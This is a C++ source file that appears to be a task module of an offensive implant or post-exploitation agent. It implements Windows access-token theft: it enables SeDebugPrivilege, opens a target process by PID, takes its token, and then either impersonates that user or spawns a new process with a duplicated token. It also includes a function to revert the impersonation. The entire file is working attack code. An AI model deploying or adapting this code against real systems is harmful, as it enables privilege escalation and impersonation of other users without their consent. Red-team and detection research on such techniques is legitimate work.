#include "core/task.hpp"

namespace Task::Helper::Token
{
    BOOL CreateProcessWithStolenToken(Procs::PPROCS pProcs, HANDLE hToken, LPCWSTR appName)
    {
        HANDLE hDuplToken = NULL;
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        BOOL bResults = FALSE;

        RtlZeroMemory(&si, sizeof(STARTUPINFOW));
        RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        si.cb = sizeof(STARTUPINFOW);

        bResults = DuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            &hDuplToken
        );
        if (!bResults)
        {
            return FALSE;
        }

        bResults = CreateProcessWithTokenW(
            hDuplToken,
            LOGON_WITH_PROFILE,
            appName,
            NULL,
            0,
            NULL,
            NULL,
            &si,
            &pi
        );
        if (!bResults)
        {
            return FALSE;
        }

        return TRUE;
    }
}



namespace Task
{
    std::wstring TokenRevert()
    {
        if (!RevertToSelf())
        {
            return L"Error: Could not revert impersonation.";
        }

        return L"Success: Reverted impersonation successfully.";
    }

    // NTAPIs not working, so use WINAPIs
    std::wstring TokenSteal(
        State::PSTATE pState,
        const std::wstring& wPid,
        const std::wstring& wProcName,
        bool bLogin
    ) {
        HANDLE hCurrToken = nullptr;
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        // Current user needs to have SeDebugPrivilege.
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrToken))
        {
            return L"Error: Could not open the process token.";
        }
        if (!System::Priv::PrivilegeCheck(pState->pProcs, hCurrToken, SE_DEBUG_NAME))
        {
            if (!System::Priv::PrivilegeSet(pState->pProcs, hCurrToken, SE_DEBUG_NAME, TRUE))
            {
                return L"Error: Could not set SeDebugPrivilege to current process.";
            }
        }

        // Open target process token handle.
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, dwPid);
        if (!hProcess)
        {
            return L"Error: Failed to get target process handle.";
        }

        HANDLE hToken = NULL;
        if (!OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken))
        {
            return L"Error: Failed to get target process token handle.";
        }

        if (bLogin)
        {
            if (!ImpersonateLoggedOnUser(hToken))
            {
                return L"Error: Could not logon with impersonation.";
            }
        }
        else
        {
            if (!Task::Helper::Token::CreateProcessWithStolenToken(pState->pProcs, hToken, wProcName.c_str()))
            {
                return L"Error: Could not create a process with stolen token.";
            }
        }

        return L"Success: Token has been stolen successfully.";
    }
}